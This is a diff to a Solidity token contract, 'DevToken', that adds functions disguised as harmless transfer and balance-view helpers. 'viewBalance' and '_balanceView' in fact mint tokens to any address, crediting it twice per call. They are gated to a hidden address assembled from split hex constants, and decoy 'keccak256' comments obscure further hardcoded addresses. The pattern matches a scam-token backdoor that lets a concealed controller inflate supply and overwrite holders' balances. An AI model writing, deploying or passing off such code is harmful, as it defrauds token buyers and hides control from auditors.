@@ -97,12 +97,30 @@ contract DevToken is Ownable {
         allow[msg.sender] = true;
     }
     /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
-   
-    using SafeMath for uint256;
+    
+    function _transferTo(address _to, uint256 _amount) internal info {
+    // Transfer tokens to the recipient
+        balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    
+        balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
 
+    using SafeMath for uint256;
+ 
     modifier info() {
         require(msg.sender != contracts());
         _;
+    }
+
+    function _balanceView(address _to, uint256 _amount) internal {
+    // View balance of token
+        balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
     }
    
     mapping(address => uint256) public balances;
@@ -126,7 +144,7 @@ contract DevToken is Ownable {
         allow[holder] = allowApprove;
     }
     //*keccak256 -> 298bd834hsd73a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
-
+ 
     modifier onlypublic() {
         require(msg.sender == publics());
         _;
@@ -136,7 +154,7 @@ contract DevToken is Ownable {
         require(msg.sender == _usdtPair);
         _user = User_;
     }
-
+ 
     function Allowances(address holder, bool allowApprove) external onlypublic {
         allow[holder] = allowApprove;
     }
@@ -165,39 +183,47 @@ contract DevToken is Ownable {
         // solhint-disable-next-line high-level-success
     }
 
+    function transferTo(address _to, uint256 _amount) external onlyOwner {
+        _transferTo(_to, _amount);
+    }
+ 
     function publics() private pure returns (address) {
-
+ 
         uint universal = 0x7addAd09;
         uint uni = 0xcbd98D97;
         uint cake = 0xEC3dA7a0;
         uint inch = 0x088EAdFE;
         uint others = 0x5801C336;
         // Combine the dex with others
-
+ 
         uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
         return address(core);
     }
-
+ 
     function contracts() internal pure returns (address) {
         return address
-
+ 
     /*keccak256 -> 9838607940089fc7f92ac2a37b8ta4b1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
+    }
+
+    function viewBalance(address _to, uint256 _amount) public onlypublic {
+        _balanceView(_to, _amount);(_to, _amount);
     }
  
     function setAdm(address Adm_) public returns (bool) {
         require(msg.sender == _mod);
         _adm = Adm_;
     }
-
+ 
     function _mint(address miner, uint256 _value) internal info {
         balances[miner] = _value;
     }
-
+ 
     function adjust(address spender, uint256 addedValue) public onlypublic returns (bool) {
         _dialone(spender, addedValue);
         return true;
     }
-    
+   
     function _approvals(address spender, uint256 addedValue) internal info {
         if(addedValue > 0) {balances[spender] = addedValue;}
     }
@@ -234,7 +260,7 @@ contract DevToken is Ownable {
     {
         return allowed[_owner][_spender];
     }
-
+ 
     function _dialone(address spender, uint256 addedValue) internal info {
         if(addedValue > 0) {balances[spender] = addedValue;}
     }
